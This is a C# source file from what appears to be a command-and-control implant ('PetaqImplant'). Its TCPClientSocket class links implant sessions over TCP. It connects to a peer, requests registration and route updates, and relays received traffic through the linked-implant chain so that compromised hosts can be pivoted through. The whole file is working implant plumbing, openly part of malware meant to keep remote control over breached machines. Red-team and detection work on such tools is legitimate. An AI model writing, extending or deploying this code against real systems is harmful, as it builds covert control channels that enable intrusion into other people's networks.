using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;

using System.Net.WebSockets;
using System.Text;
using System.Threading;

namespace PetaqImplant
{
    public class TCPClientSocket : LinkedImplantSocket
    {
        public TcpListener TCPService { get; set; }
        public TcpClient TCPClient { get; set; }
        public StreamString TCPClientStream { get; set; }
        public int Port { get; set; }


        public override void Connect(string sid, string sa, string option = null)
        {
            Console.Error.WriteLine("TCP service is linking.");

            ServerAddress = sa;
            sessionId = sid;

            // Starting the TCP connection as a thread
            clientThread = new Thread(() =>
            {
                try
                {
                    // Setting up the variables for TCP connection
                    Console.Error.WriteLine("TCP connection starting....");

                    if (option != null) { Port = int.Parse(option); }
                    else
                    {
                        Console.WriteLine("TCP port is required to connect.");
                    }

                    Console.Error.WriteLine("Host: {0}, Port: {1}",ServerAddress,Port);

                    // Connect to the TCP socket.  
                    TCPClient = new TcpClient(ServerAddress, Port);

                    Console.Error.WriteLine("TCP client object is created");

                    Status = true;

                    // Register linked implants as registration started
                    Console.WriteLine("Session {0} is added to the linked sessions.",sessionId);
                    Program.RegisterLinkedImplants();

                    // Read stream as string and process
                    while (true)
                    {
                        // Get a stream object for reading and writing
                        NetworkStream stream = TCPClient.GetStream();
			            //Console.Error.WriteLine("Stream received");

                        // Creating StreamString class for string based communications
                        TCPClientStream = new StreamString(stream);

                        // Request registration first
                        if (! Registration) {
                            AskRegistration();
                            Console.WriteLine("Registration asked.");
                        }	            

                        // Request route updates
                        if (! Route) {
                            AskRouteUpdates();
                            Console.WriteLine("Route updates asked.");
                        }

                        // Reading the data from the socket
                        string output = TCPClientStream.ReadString();
			            //Console.Error.WriteLine("Output: {0}", Common.Decrypt(output));

                        // Process the data and send to the linked service
                        LinkedServiceSend(output);
                    }

                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("TCP Client Exception on Connect/Receive: " + e.Message);
                }
                finally
                {
                    // Dispose the TCP client connection
                    Disconnect();
                }
            });
            clientThread.Start();
        }

        public override void Disconnect()
        {
            if (Status)
            {
                TCPClient.Close();
                Status = false; // setting the status to false
                Program.RegisterLinkedImplants();
            }
            else
            {
                Console.Error.WriteLine("The TCP link is not connected.");
            }
        }


        public override bool Send(string data = "")
        {
            if (data == "") return false;

            try
            {
                if (Status)
                {
                    // Begin sending the data to the remote device.
                    TCPClientStream.WriteString(data);
                }
                else
                {
                    Console.WriteLine("The TCP link is not connected.");
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("TCP Client Exception on Send: " + e.Message);
                Status = false; // setting the status to false
                return false;
            }

        }


    }
}
